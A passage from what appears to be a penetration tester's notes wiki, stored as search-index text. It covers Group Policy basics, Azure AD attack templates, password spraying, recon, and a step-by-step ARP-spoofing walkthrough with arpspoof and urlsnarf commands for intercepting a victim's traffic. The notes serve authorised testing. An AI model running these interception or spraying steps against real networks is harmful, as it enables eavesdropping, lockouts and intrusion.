powerful, and a misconfigured GPO can shutdown the operation of an company. It is also extremly granular. You can make detailed changes applied to only a few objects in a specific OU. There are some best practices that are good to keep in mind when using GPOs: Keep user and computer settings in different GPOs. Apply the smallest number of GPOs to solve the problem. Try to avoid duplicating settings in differnt GPOs. Two GPOs are create by default when you first install Active Directory: Default Domain Policy - Basically only sets the Password and lockout policy. Default Domain Controllers Policy - Set security configurations for the Domain Controllers. It is common to not edit the default policies and instead create new ones. If you mess things up, you can just remove those policies and you always have the default ones clean. Started GPOs It is common to create template GPOs, these are called Starter GPOs. These can be used if you need to create multiple GPOs that share a lot of configurations, but differ on some.","title":"Group Policies"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#working-with-gpos","text":"GPOs are managed from the \"Group Policy Management Console\" (GPMC or just GPM). In broad strokes a GPO allows for computer configuration and user configurations. Computer configuration - applied to the computer irrespective of the user who logged on. User configuration - applied to the user irrespective of the computer they're using. Both of these configurations (User and computer) have Policies and Preference settings. Policies for user configuration are placed in the HKEY_CURRENT_USER (HKCU) area of the Registry, while those for computer configurations are placed in the HKEY_LOCAL_MACHINE (HKLM) area. Policies Policies contain settings that have been available since Group Policy was introduced in Windows 2000. These are thousands of settings that can be done. They are divided up in three groups: Software settings, Windows settings, and Administrative Template. Both User and Computer configurations have the same main categories (Software, Windows, Administrative Template). But the differe. So some configurations are only available for Computers, and other are only Available for Users. In fact, the Computer Configuration branch has 1644 settings available, whereas the User Configuration branch has 1453 settings available. Computer policies are the following: Software settings - Used to automatically install programs. You configure a UNC path to a .msi and that package will be installed the assigned computer, or the computer where a user log in. Windows settings - DNS, Startup/shutdown scripts, Deploy printer, and Security - firewall rules, trusted root certificate, password options, audit logs. Administrative Template - This is where the majority of configurations are. Not really use the difference between Windows settings and Administrative Template. Preferences Preferences are what they sound like: they are what is prefered. This means that they can be overridden by a user. It is just a preference, not a law. Before prefences was included in Windows 2008 many configurations were configured through logon-scripts. Things that are configured with Preferences are: - Drive and printer mappings - Power scheme management - File and folder management, including creating and deleting files and folders - Applications - Network share management - Scheduled tasks (This is where the GPP-vuln is found - see (Passwords in Group Policy Preferences)[../active_directory_privilege_escalation/passwords_in_group_policy_preferences]) - Services - Also suceptible to GPP-vuln. It is possible, and probably a good idea, to disable all User configurations if a GPO is suppose to be applied only to Computers, and vice verse. This can be done in the","title":"Working with GPOs"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#applying-gpos","text":"The process of applying a GPO to a specific container (Site, Domain, OU) is usually called linking. If you haev a GPO but it is not linked to any container then it doesnt really do anything. You can link and unlink a GPO. You usually do this but opening the GPMC and then either click on a container and create a new GPO. Or create a GPO in \"Group Policy Objects\" and then drag the GPO to the container you want to link it to. It usually takes up to 90 minutes for the computers in the domain to poll for the new GPOs, this can be bypassed by runnign the command gpupdate /force . Security updates cna take up to 16 hours. Domain Controllers update GPOs every 5 minutes.","title":"Applying GPOs"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#order-of-applying-gpos","text":"Site Domain OU Nested OU If multiple GPOs have made the same GPO change, the lowest in the chain (closes to the leaf) is the one that will be applied.","title":"Order of applying GPOs"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#blocking-and-overriding","text":"Blocknig inheritance GPOs are inherited by OUs. So if one OU has a GPO linked to it, the GPO will be applied to all the sub-OUs. The GPO is therefore inherited. If you do not want sub-OUs to inherit GPOs you can configure that OU to block inheritance. Overriding / Enforced If an OU has blocked the inheritance it is still possible to override that setting by configuring the GPO above to be Enforced. If it is enforced the below OUs can't block inheritance.","title":"BLocking and overriding"},{"location":"attacking_active_directory_domain/understanding_active_directory/group_policies/#filtering","text":"Group It is possible to filter whom the GPO will be applied to further. This cna be done with the Filter options. You can add Groups, and only the users belonging to that group will have the GPO applied. The default is \"Authenticated users\". WMI Filter You can also filter whom the GPO will be applied to by using WMI filters. With WMI you can filter on computer disk space, OS version, etc","title":"Filtering"},{"location":"attacking_active_directory_domain/understanding_active_directory/kerberos/","text":"","title":"Kerberos"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/","text":"Background # If the user you have compromised has the role \"Application Administrator\" assigned to it that role can be used to manage Azure Applications. One such application is AzureAD - the application that administrer the AzureAD. A user with the role \"Application Administrator\" can add credentials to the AzureAD application. After that the user can impersonate the AzureAD application and then edit AzureAD users, and thereby escalate its privileges. Pre-requisites # AzureAD user with the role \"Application Administrator\". Risks # How to check for # How to exploit # Recommendation # Related Vulnerabilities # This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue] References #","title":"Abuse Application Administrator Role"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#background","text":"If the user you have compromised has the role \"Application Administrator\" assigned to it that role can be used to manage Azure Applications. One such application is AzureAD - the application that administrer the AzureAD. A user with the role \"Application Administrator\" can add credentials to the AzureAD application. After that the user can impersonate the AzureAD application and then edit AzureAD users, and thereby escalate its privileges.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#pre-requisites","text":"AzureAD user with the role \"Application Administrator\".","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#risks","text":"","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#related-vulnerabilities","text":"This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue]","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/abuse_application_administrator_role/#references","text":"","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/","text":"Background # Pre-requisites # You need the password hash of AZUREADSSOACC$ . Risks # How to check for # How to exploit # Recommendation # Related Vulnerabilities # References # https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html","title":"Abuse Azure AD SSO"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#background","text":"","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#pre-requisites","text":"You need the password hash of AZUREADSSOACC$ .","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#risks","text":"","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/abuse_azure_ad_sso/#references","text":"https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/","text":"Background # Blobs are Azure equivalent to Buckets. They can be misconfigured in the same way as aws buckets. Pre-requisites # Access to an Azure account which is associated with an azure subscription. # Login using azure cli az login # list subscriptions az account list If no subscriptions are associated with the user you won't be able to do much. Risks # No risks. How to check for # connect-azuread get-AzureADServicePrincipal Look for TenantDomain . Search the internets for For example: site:<tenantdomain>.blob.core.windows.net site:<tenantdomain>.file.core.windows.net site:<tenantdomain>.table.core.windows.net site:<tenantdomain>.queue.core.windows.net If you find one you can perform a directory-search. How to exploit # Recommendation # Related Vulnerabilities # References # https://www.youtube.com/watch?v=AWhag2K3AS8","title":"Check for Blobs"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#background","text":"Blobs are Azure equivalent to Buckets. They can be misconfigured in the same way as aws buckets.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#pre-requisites","text":"Access to an Azure account which is associated with an azure subscription. # Login using azure cli az login # list subscriptions az account list If no subscriptions are associated with the user you won't be able to do much.","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#risks","text":"No risks.","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#how-to-check-for","text":"connect-azuread get-AzureADServicePrincipal Look for TenantDomain . Search the internets for For example: site:<tenantdomain>.blob.core.windows.net site:<tenantdomain>.file.core.windows.net site:<tenantdomain>.table.core.windows.net site:<tenantdomain>.queue.core.windows.net If you find one you can perform a directory-search.","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/check_for_blobs/#references","text":"https://www.youtube.com/watch?v=AWhag2K3AS8","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/","text":"Background # Groups in AzureAD can be configured to be \"Public\". If it is the emails sent to those groups are readible to any authenticated user. If a group is misconfigured anyone would be able to read those emails. Pre-requisites # Risks # How to check for # get-msol How to exploit # Recommendation # Related Vulnerabilities # References #","title":"Check for Misconfigured AzureAD groups"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#background","text":"Groups in AzureAD can be configured to be \"Public\". If it is the emails sent to those groups are readible to any authenticated user. If a group is misconfigured anyone would be able to read those emails.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#risks","text":"","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#how-to-check-for","text":"get-msol","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/check_for_misconfigured_azuread_groups/#references","text":"","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/","text":"Background # These attacks are pretty much the same as in any cloud. If the compromised user is assigned the role \"Global Reader\" or \"Global Contributor\" you might be able to read some sensitive data. You try to read keyvault. Application Service configurations - might contain creds - deplyment credentisl, database credentials. Automation accounts - Credentials for azure automation accounts Just like any privilege escalation attack in a cloud provider. Pre-requisites # Access to an Azure account which is associated with an azure subscription. # Login using azure cli az login # list subscriptions az account list If no subscriptions are associated with the user you won't be able to do much. Your user must have the role Global Reader assigned to it. Risks # No risks. How to check for # https://github.com/hausec/PowerZure PowerZure can be used to check for secrets. get-runbooks How to exploit # Recommendation # Related Vulnerabilities # References # https://www.youtube.com/watch?v=AWhag2K3AS8","title":"Check for Passwords Azure"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#background","text":"These attacks are pretty much the same as in any cloud. If the compromised user is assigned the role \"Global Reader\" or \"Global Contributor\" you might be able to read some sensitive data. You try to read keyvault. Application Service configurations - might contain creds - deplyment credentisl, database credentials. Automation accounts - Credentials for azure automation accounts Just like any privilege escalation attack in a cloud provider.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#pre-requisites","text":"Access to an Azure account which is associated with an azure subscription. # Login using azure cli az login # list subscriptions az account list If no subscriptions are associated with the user you won't be able to do much. Your user must have the role Global Reader assigned to it.","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#risks","text":"No risks.","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#how-to-check-for","text":"https://github.com/hausec/PowerZure PowerZure can be used to check for secrets. get-runbooks","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/check_for_passwords_azure/#references","text":"https://www.youtube.com/watch?v=AWhag2K3AS8","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/","text":"Background # Multiple services can be accessible to an authenticated Azure AD account. Some of these services might no be relevant to all users. If they are not relevant yet available to all users this introduce unnecessary access to data/applications. Pre-requisites # Access to an Azure AD account. Risks # No risks. How to check for # Get-AzADApplication How to exploit # Recommendation # Related Vulnerabilities # References #","title":"Check for SSO Enabled Services"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#background","text":"Multiple services can be accessible to an authenticated Azure AD account. Some of these services might no be relevant to all users. If they are not relevant yet available to all users this introduce unnecessary access to data/applications.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#pre-requisites","text":"Access to an Azure AD account.","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#risks","text":"No risks.","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#how-to-check-for","text":"Get-AzADApplication","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/check_for_sso_enabled_services/#references","text":"","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/","text":"Background # When On-Prem AD and AzureAD are connected one new on-prem account is created, and one new AzureAD account is created. On-prem account is called MSOL_ -and then some random string. This account has DCSync privileges, and sshould therefore be considered a tier 0 resource. MSOL-account can perform syncornization with AzureAD. The syncronization job is performed on a server. Which server that is is disclosed in the description attribute of the MSOL-user. It says something like: Account created by Microsoft Azure Active Directory Connect with installation identifier <RANDOM STRING> running on computer <NAME OF COMPUTER> configured to synchronize to tenant <XXXX.onmicrosoft.com> By compromising the server or the account it is possible to perform a DCSync attack. Pre-requisites # Risks # How to check for # How to exploit # Recommendation # Related Vulnerabilities # This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue] References #","title":"Password Hash Syncronization"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#background","text":"When On-Prem AD and AzureAD are connected one new on-prem account is created, and one new AzureAD account is created. On-prem account is called MSOL_ -and then some random string. This account has DCSync privileges, and sshould therefore be considered a tier 0 resource. MSOL-account can perform syncornization with AzureAD. The syncronization job is performed on a server. Which server that is is disclosed in the description attribute of the MSOL-user. It says something like: Account created by Microsoft Azure Active Directory Connect with installation identifier <RANDOM STRING> running on computer <NAME OF COMPUTER> configured to synchronize to tenant <XXXX.onmicrosoft.com> By compromising the server or the account it is possible to perform a DCSync attack.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#risks","text":"","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#related-vulnerabilities","text":"This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue]","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/password_hash_syncronization/#references","text":"","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/","text":"Background # Identify valid email-accounts. Pre-requisites # Risks # Depending on the lockout policy you risk locking out users, and thus cause considerable damage. It also produces lots of logs. How to check for # First check if the accounts is valid. https://github.com/LMGsec/o365creeper Perform password spraying attack: https://github.com/dafthack/MailSniper How to exploit # Recommendation # Related Vulnerabilities # This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue] References # https://github.com/LMGsec/o365creeper","title":"Password Spraying"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#background","text":"Identify valid email-accounts.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#risks","text":"Depending on the lockout policy you risk locking out users, and thus cause considerable damage. It also produces lots of logs.","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#how-to-check-for","text":"First check if the accounts is valid. https://github.com/LMGsec/o365creeper Perform password spraying attack: https://github.com/dafthack/MailSniper","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#related-vulnerabilities","text":"This finding should not be reported as the name of this issue, instead it should be reported as the vulnerabilities written below. The below written vulnerabilities map to the vulnerability-descriptions in that repo. For example, if kerberoast, report as the following vulnerabilities if they are applicable: Weak password [ID of issue] Overpriviliged kerberoastable user [ID of issue]","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/password_spraying/#references","text":"https://github.com/LMGsec/o365creeper","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/","text":"Background # If sensitive data is stored in the description field on Active Directory objects those can usually be accessed by any domain user. Pre-requisites # Domain joined user account. - Msonline or AzureAD powershell module # Risks # Might be seen in logs. How to check for # get-msolgroup -All | select-object -Property DisplayName,Description | export-csv -path group-descriptions.csv How to exploit # Recommendation # Related Vulnerabilities # References #","title":"Password in Active Directory Attribute"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#background","text":"If sensitive data is stored in the description field on Active Directory objects those can usually be accessed by any domain user.","title":"Background"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#pre-requisites","text":"Domain joined user account.","title":"Pre-requisites"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#-msonline-or-azuread-powershell-module","text":"","title":"- Msonline or AzureAD powershell module"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#risks","text":"Might be seen in logs.","title":"Risks"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#how-to-check-for","text":"get-msolgroup -All | select-object -Property DisplayName,Description | export-csv -path group-descriptions.csv","title":"How to check for"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_cloud_environment/attacking_azure/passwords_in_active_directory_attribute/#references","text":"","title":"References"},{"location":"attacking_cloud_environment/attacking_azure/recon/","text":"Check if victim organization has AzureAD # https://login.microsoftonline.com/getuserrealm.srf?login=username@<victimorganization>.onmicrosoft.com&xml=1","title":"Recon"},{"location":"attacking_cloud_environment/attacking_azure/recon/#check-if-victim-organization-has-azuread","text":"https://login.microsoftonline.com/getuserrealm.srf?login=username@<victimorganization>.onmicrosoft.com&xml=1","title":"Check if victim organization has AzureAD"},{"location":"attacking_external_network/attacking_external_networks/","text":"Scanning # Att verifiera innan # Initialt # B\u00f6rja med att ta en ip-address och kolla den mot whois. Kolla vilken range den ing\u00e5r i. Till exempel: 86.104.27.136 - 86.104.27.143 Kolla vem det \u00e4r som \u00e4ger IP-addresserna. Om det \u00e4r h\u00f6ga rangear, s\u00e5 \u00e4r det sannolikt en ISP. S\u00f6k lite p\u00e5 Shodan # shodan search f\u00f6retagsnamn shodan search org:f\u00f6retagsnamn Kolla databasdumpar # greppa efter f\u00f6retdagsdom\u00e4nen Nmap recon # Before you start scanning with","title":"Attacking External Networks"},{"location":"attacking_external_network/attacking_external_networks/#scanning","text":"","title":"Scanning"},{"location":"attacking_external_network/attacking_external_networks/#att-verifiera-innan","text":"","title":"Att verifiera innan"},{"location":"attacking_external_network/attacking_external_networks/#initialt","text":"B\u00f6rja med att ta en ip-address och kolla den mot whois. Kolla vilken range den ing\u00e5r i. Till exempel: 86.104.27.136 - 86.104.27.143 Kolla vem det \u00e4r som \u00e4ger IP-addresserna. Om det \u00e4r h\u00f6ga rangear, s\u00e5 \u00e4r det sannolikt en ISP.","title":"Initialt"},{"location":"attacking_external_network/attacking_external_networks/#sok-lite-pa-shodan","text":"shodan search f\u00f6retagsnamn shodan search org:f\u00f6retagsnamn","title":"S\u00f6k lite p\u00e5 Shodan"},{"location":"attacking_external_network/attacking_external_networks/#kolla-databasdumpar","text":"greppa efter f\u00f6retdagsdom\u00e4nen","title":"Kolla databasdumpar"},{"location":"attacking_external_network/attacking_external_networks/#nmap-recon","text":"Before you start scanning with","title":"Nmap recon"},{"location":"attacking_internal_network/active_information_gathering/","text":"Active information gathering # Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target. Netdiscover # This tool is used to scan a network for live machines. netdiscover -r 192.168.1.1/24 Nikto # Nikto is a good tool to scan webservers. It is very intrusive. nikto -host 192.168.1.101 References # https://blog.bugcrowd.com/discovering-subdomains https://high54security.blogspot.cl/2016/01/recon-ng-and-power-to-crawl-trough.html","title":"Active Information Gathering"},{"location":"attacking_internal_network/active_information_gathering/#active-information-gathering","text":"Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target.","title":"Active information gathering"},{"location":"attacking_internal_network/active_information_gathering/#netdiscover","text":"This tool is used to scan a network for live machines. netdiscover -r 192.168.1.1/24","title":"Netdiscover"},{"location":"attacking_internal_network/active_information_gathering/#nikto","text":"Nikto is a good tool to scan webservers. It is very intrusive. nikto -host 192.168.1.101","title":"Nikto"},{"location":"attacking_internal_network/active_information_gathering/#references","text":"https://blog.bugcrowd.com/discovering-subdomains https://high54security.blogspot.cl/2016/01/recon-ng-and-power-to-crawl-trough.html","title":"References"},{"location":"attacking_internal_network/arp-spoofing/","text":"Arp-spoofing - Sniffing traffic # Step 1 # Run nmap or netdiscover to list the devices on the network. netdiscover -r 192.168.1.0/24 or whatever network range it is. This is good because it is live, and it updates as soon as new devices connect to the network. nmap -vvv 192.168.1.0/24 Step 2 # echo 1 > /proc/sys/net/ipv4/ip_forward this command is fundamental. Without changing it to 1 you will only block the traffic, but not forward it. So that will bring down the connection for that person. Denial of service. If you want to do that make sure it is set to 0. If you want to intercept it make sure it is set to 1. Step 3 # arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105 -i is the interface flag. In this example we choose the wlan0 interface. Run ifconfig to see which interfaces you have available. -t the target flag. It specifies your target. The first address is the router, and the second is the specific device you want to target. Step 4 - Read the traffic # So now you are intercepting the traffic. You have a few choices how to read it. Use urlsnarf. urlsnarf -i wlan0 it will output all URLs. driftnet -i wlan0 Driftnet is pretty cool. It let's you see all the images that is loaded in the targets browser in real time. Not very useful, but kind of cool. - wireshark. Just open wireshark and select the interface and start capturing. - Tcpdump. Also awesome.","title":"ARP Spoofing"},{"location":"attacking_internal_network/arp-spoofing/#arp-spoofing-sniffing-traffic","text":"","title":"Arp-spoofing - Sniffing traffic"},{"location":"attacking_internal_network/arp-spoofing/#step-1","text":"Run nmap or netdiscover to list the devices on the network. netdiscover -r 192.168.1.0/24 or whatever network range it is. This is good because it is live, and it updates as soon as new devices connect to the network. nmap -vvv 192.168.1.0/24","title":"Step 1"},{"location":"attacking_internal_network/arp-spoofing/#step-2","text":"echo 1 > /proc/sys/net/ipv4/ip_forward this command is fundamental. Without changing it to 1 you will only block the traffic, but not forward it. So that will bring down the connection for that person. Denial of service. If you want to do that make sure it is set to 0. If you want to intercept it make sure it is set to 1.","title":"Step 2"},{"location":"attacking_internal_network/arp-spoofing/#step-3","text":"arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105 -i is the interface flag. In this example we choose the wlan0 interface. Run ifconfig to see which interfaces you have available. -t the target flag. It specifies your target. The first address is the router, and the second is the specific device you want to target.","title":"Step 3"},{"location":"attacking_internal_network/arp-spoofing/#step-4-read-the-traffic","text":"So now you are intercepting the traffic. You have a few choices how to read it. Use urlsnarf. urlsnarf -i wlan0 it will output all URLs. driftnet -i wlan0 Driftnet is pretty cool. It let's you see all the images that is loaded in the targets browser in real time. Not very useful, but kind of cool. - wireshark. Just open wireshark and select the interface and start capturing. - Tcpdump. Also awesome.","title":"Step 4 - Read the traffic"},{"location":"attacking_internal_network/basics_of_networking/","text":"Forward traffic through a windows machine / Bridge connections on windows # Case: You need to forward traffic from your computer through a windows-computer. This might be because you can't connect your own machine on the network. Bridge # You can of course bridge two connections. But that might not be want you want, since that will effectivly add your computer to the local LAN. This will allow other computers on the network to connect to yours. The sysadmins might also wonder what your computer is doing there, which computer it is that has that IP address. In windows 7 you do the following to bridge two networks: Control Panel / Network and internet / Network and sharing center / Change adapter settings / Mark both Interfaces at the same time, right-click on them and click on \"Bridge interfaces\". Now on your client-computer you just have to put the interface in DHCP mode, and you will receive an IP-address. LAN # If you prefer to work from your private LAN that can be arranged too. You need two network interfaces for it to work. One connected to the internet (or other LAN) and another connected to your computer (or a switch or whatever). Once that is done you go to: Control Panel / Network and internet / Network and sharing center Right click on the network interface that is connected to the internet (usually called something like Local Area Connection 1). Click on Properties then Sharing then click on Allow other network computer users ... . Now if you run ipconfig your other network interface should have a LAN ip. For example 192.168.137.1 . Now you just take your other computer and just configure a static ip address for it, for example Maybe delete the previous ip-address: sudo ip a del 192.168.66.55/24 dev eth0 Then add a new sudo ip a add 192.168.137.2/24 dev eth0 Then add some routes: sudo ip r add default via 192.168.137.1 dev eth0","title":"Basics of Networking"},{"location":"attacking_internal_network/basics_of_networking/#forward-traffic-through-a-windows-machine-bridge-connections-on-windows","text":"Case: You need to forward traffic from your computer through a windows-computer. This might be because you can't connect your own machine on the network.","title":"Forward traffic through a windows machine / Bridge connections on windows"},{"location":"attacking_internal_network/basics_of_networking/#bridge","text":"You can of course bridge two connections. But that might not be want you want, since that will effectivly add your computer to the local LAN. This will allow other computers on the network to connect to yours. The sysadmins might also wonder what your computer is doing there, which computer it is that has that IP address. In windows 7 you do the following to bridge two networks: Control Panel / Network and internet / Network and sharing center / Change adapter settings / Mark both Interfaces at the same time, right-click on them and click on \"Bridge interfaces\". Now on your client-computer you just have to put the interface in DHCP mode, and you will receive an IP-address.","title":"Bridge"},{"location":"attacking_internal_network/basics_of_networking/#lan","text":"If you prefer to work from your private LAN that can be arranged too. You need two network interfaces for it to work. One connected to the internet (or other LAN) and another connected to your computer (or a switch or whatever). Once that is done you go to: Control Panel / Network and internet / Network and sharing center Right click on the network interface that is connected to the internet (usually called something like Local Area Connection 1). Click on Properties then Sharing then click on Allow other network computer users ... . Now if you run ipconfig your other network interface should have a LAN ip. For example 192.168.137.1 . Now you just take your other computer and just configure a static ip address for it, for example Maybe delete the previous ip-address: sudo ip a del 192.168.66.55/24 dev eth0 Then add a new sudo ip a add 192.168.137.2/24 dev eth0 Then add some routes: sudo ip r add default via 192.168.137.1 dev eth0","title":"LAN"},{"location":"attacking_internal_network/dns_zone_transfer_attack/","text":"DNS Zone Transfer Attack # Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way: To do this we first need to figure out which DNS-servers a domain has. host -t ns wikipedia.com host -l wikipedia.com ns1.wikipedia.com This can also be done with tools such as dnsrecon and dnsenum. https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack","title":"Zone Transfer Attack"},{"location":"attacking_internal_network/dns_zone_transfer_attack/#dns-zone-transfer-attack","text":"Sometimes DNS servers are misconfigured. The DNS server contains 